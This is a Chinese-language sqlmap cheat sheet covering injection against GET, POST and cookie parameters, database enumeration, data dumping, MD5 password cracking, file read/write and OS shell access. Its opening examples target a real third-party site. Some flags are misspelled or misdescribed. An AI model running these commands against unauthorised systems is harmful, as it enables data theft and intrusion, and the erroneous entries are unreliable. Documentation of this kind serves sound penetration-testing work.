SQLMap

常用手法

[!ob-info] 常用手法
sqlmap -u “https://www.baidu.com“ –level 3 –risk 2 –banner –batch

http

GET

sqlmap -u "https://www.baidu.com"

POST

使用–data参数

sqlmap -u "http://192.168.31.250" --data "id=1&ns=1"

使用–form参数（自动搜索表单信息）

sqlmap -u "http://192.168.31.250" --froms

COOKIE

sqlmap -u "http://192.168.31.250" –-cookie "id=11" –level 2（只有level达到2才会检测cookie）

https

跑https的数据包（–force-ssl）

sqlmap -u "http://192.168.31.250" --force-ssl

信息检测

数据库版本号

sqlmap -u "http://192.168.31.250" --banner

用户信息

当前用户（–current-user）

sqlmap -u "http://192.168.31.250" --current-user

所有用户（–users）

sqlmap -u "http://192.168.31.250" --users

系统架构

sqlmap -u "http://192.168.31.250" --schema

辅助功能

请求延迟（–delay）

sqlmap -u "http://192.168.31.250" --delay 1

超时设置（–timeout）

sqlmap -u "http://192.168.31.250" --timeout 5

代理设置（–proxy）

sqlmap -u "http://192.168.31.250" --proxy "127.0.0.1:8080"

刷新缓存（–flush-session）

sqlmap -u "http://192.168.31.250" --flush-session

扫描默认选择yes（–batch）

sqlmap -u "http://192.168.31.250" --batch

数据扫描

数据库

当前数据库（–current-db）

sqlmap -u "http://192.168.31.250" --current-db

所有数据库（–dbs）

sqlmap -u "http://192.168.31.250" --dbs

指定数据库（-D）

sqlmap -u "http://192.168.31.250" -D "数据库名"

数据表

爆破数据表（–common-tables）

sqlmap -u "http://192.168.31.250" -D "数据库名" --common-tables

所有数据表（–tables）

sqlmap -u "http://192.168.31.250" -D "数据库名" --tables

指定数据表（-T）

sqlmap -u "http://192.168.31.250" -D "数据库名" -T "数据表"

字段

爆破字段（–common-columns）

sqlmap -u "http://192.168.31.250" -D "数据库名" -T "数据表" --common-columns

所有字段（–columns）

sqlmap -u "http://192.168.31.250" -D "数据库名" -T "数据表" --columns

指定字段（-C）

sqlmap -u "http://192.168.31.250" -D "数据库名" -T "数据表" -C "字段名"

数据

查看所有数据（–dump）

sqlmap -u "http://192.168.31.250" -D "数据库名" -T "数据表" -C "字段名" --dump

查看数据个数（–count）

sqlmap -u "http://192.168.31.250" -D "数据库名" -T "数据表" -C "字段名" --count

列出并进行破解密码，仅限于MD5（–passwords）

sqlmap -u "http://192.168.31.250" -D "数据库名" -T "数据表" -C "字段名" --passwords

SQLMap高级用法

扫描级别

探测等级（level）

sqlmap -u "http://192.168.31.250" --level 3

危险等级（risk）

sqlmap -u "http://192.168.31.250" --risk 2

其他方式扫描

指定数据包

sqlmap -r 1.txt （在POST数据包中，可以使用-p指定参数+-r来达到指定参数的效果）

指定文件
将所有的url存放在文件中，使用-f一次扫描

sqlmap -f 1.txt

HTTP头设置

User-Agent

指定UA头（–user-agent）

sqlmap -u "http://192.168.31.250" --user-agent

随机UA头（–random-agent）

sqlmap -u "http://192.168.31.250" --random-agent

手机UA头（–mobile）

sqlmap -u "http://192.168.31.250" --mobile

Referer

sqlmap -u "http://192.168.31.250" --referer

Host

sqlmap -u "http://192.168.31.250" --host

其他headers头

--headers="Host:www.baidu.com\nUser-agent:Firefco"

sqlmap -u "http://192.168.31.250" --headers="" (使用\n隔开或者在sqlmap.conf中配置)

文件操作

读取文件（--file-read）

编辑文件（--file-write）

写入文件（--file-dest）

系统操作

前提 : 有管理员权限、绝对路径、PHP自动转义gpc关闭、secrue_file_prv为空

执行操作系统命令（--os-cmd）

交互式操作系统命令（--os-shell）

数据库操作

SQL命令执行（--sql-shell）

指定MySQL查询（--sql-query）

从文件中执行MySQL语句（--sql-file）

其他用法

连接数据库

sqlmap -d "mysql://账户名:密码@连接地址:3306/数据库名" 后面加上想要查询的信息
sqlmap -d "mysql://root:root@127.0.0.1:3306/mpy" --banner -f --users --dbs
